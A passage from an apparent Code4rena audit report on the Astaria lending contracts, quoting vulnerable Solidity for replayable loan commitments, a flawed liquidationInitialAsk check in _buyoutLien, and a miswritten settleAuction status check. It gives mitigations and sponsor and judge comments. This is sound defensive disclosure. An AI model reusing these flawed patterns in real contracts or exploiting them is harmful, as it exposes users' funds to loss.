succeed both times (explained before why).</li>\n</ul>\n<p>There´s one more check of the commitment to verify: the StrategyValidator one with the nlrDetails and the merkle. This is done in the Router contract by _validateCommitment().</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L434\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L434</a></p>\n<p>This will call validateAndParse on the validators contract <code>(address strategyValidator = s.strategyValidators[nlrType];)</code>.</p>\n<p>This validation and parse will depend on the validator but we have examples like UNI_V3Validator.sol</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/strategies/UNI_V3Validator.sol#L80\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/strategies/UNI_V3Validator.sol#L80</a></p>\n<p>This function makes some checks but if those checks passed the first time they will pass the second because the changes done\n(strategy.vault and stack) are not checked here.<br>\nThe leaf returned is <code>leaf = keccak256(params.nlrDetails)</code>, and it will be checked against the root and the proof.</p>\n<p>A portion of code of _validateCommitment in AstariaRouter:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">leaf</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ILienToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Details</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">details</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">IStrategyValidator</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">strategyValidator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ).</span><span class=\"mtk11\">validateAndParse</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">commitment</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// validates nlrDetails</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">COLLATERAL_TOKEN</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">commitment</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">computeId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">commitment</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">commitment</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">commitment</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rate</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) || </span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rate</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxInterestRate</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCommitmentState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">CommitmentState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INVALID_RATE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxAmount</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">commitment</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) {    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCommitmentState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">CommitmentState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INVALID_AMOUNT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      !</span><span class=\"mtk12\">MerkleProofLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">verify</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">commitment</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">merkle</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proof</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">commitment</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">merkle</span><span class=\"mtk1\">.</span><span class=\"mtk12\">root</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">leaf</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCommitmentState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">CommitmentState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INVALID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>You can add a nonce for the user and increment it each time he takes a loan.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/140#issuecomment-1413614383\">androolloyd (Astaria) disputed via duplicate issue <code>#140</code> and commented</a>:</strong></p>\n<blockquote>\n<p>Nonce increments are done manually by the user when they want to invalidate any terms that used that nonce, much like seaport does.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/140#issuecomment-1441345319\">Picodes (judge) commented via duplicate issue <code>#140</code></a>:</strong></p>\n<blockquote>\n<p>It’s great to have a way to increment the nonce manually, invalidating all orders, but in the case of Astaria, how could one say “I am ok for these terms, but only once”?</p>\n<p>Currently, if there is a path to accept multiple times the same terms, I do consider it a valid medium severity issue.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-_buyoutlien-does-not-properly-validate-the-liquidationinitialask\" style=\"position:relative;\"><a href=\"#m-02-_buyoutlien-does-not-properly-validate-the-liquidationinitialask\" aria-label=\"m 02 _buyoutlien does not properly validate the liquidationinitialask permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/587\">[M-02] <code>_buyoutLien()</code> does not properly validate the liquidationInitialAsk</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/587\">bin2chen</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/146\">chaduke</a></em></p>\n<p>Illegal liquidationInitialAsk, resulting in insufficient bids to cover the debt.</p>\n<h3 id=\"proof-of-concept-20\" style=\"position:relative;\"><a href=\"#proof-of-concept-20\" aria-label=\"proof of concept 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>_buyoutLien() will validate against liquidationInitialAsk, but incorrectly uses the old stack for validation</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_buyoutLien</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">LienStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ILienToken.LienActionBuyout </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">Stack</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newStack</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Stack</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newLien</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">....</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">potentialDebt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">encumber</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// should not be able to purchase lien if any lien in the stack is expired (and will be liquidated)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">encumber</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">].</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">EXPIRED_LIEN</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">potentialDebt</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">_getOwed</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">encumber</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">encumber</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">].</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">potentialDebt</span><span class=\"mtk1\"> &gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">encumber</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationInitialAsk</span><span class=\"mtk1\">   </span><span class=\"mtk3\">//1.****@audit use old stack</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INITIAL_ASK_EXCEEDED</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        --</span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">....</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">newStack</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_replaceStackAtPositionWithNewLien</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">encumber</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">position</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">newLien</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">encumber</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">    </span><span class=\"mtk3\">//2.****@audit replace newStack</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );    </span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Replace then verify, using the newStack[] for verification.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/587\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-03-settleauction-check-for-status-errors\" style=\"position:relative;\"><a href=\"#m-03-settleauction-check-for-status-errors\" aria-label=\"m 03 settleauction check for status errors permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/582\">[M-03] <code>settleAuction()</code> Check for status errors</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/582\">bin2chen</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/376\">kaden</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L526-L534\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L526-L534</a></p>\n<p>ClearingHouse.safeTransferFrom() to execute successfully even if there is no bid.</p>\n<h3 id=\"proof-of-concept-21\" style=\"position:relative;\"><a href=\"#proof-of-concept-21\" aria-label=\"proof of concept 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>settleAuction is called at the end of the auction and will check if the status is legal</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">settleAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralIdToAuction</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">] == </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">idToUnderlying</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">).</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">idToUnderlying</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ) !=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCollateralState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidCollateralStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">NO_AUCTION</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>This check seems to be miswritten，The normal logic would be</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralIdToAuction</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">] == </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) || </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">idToUnderlying</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">).</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span></span></span>\n<span 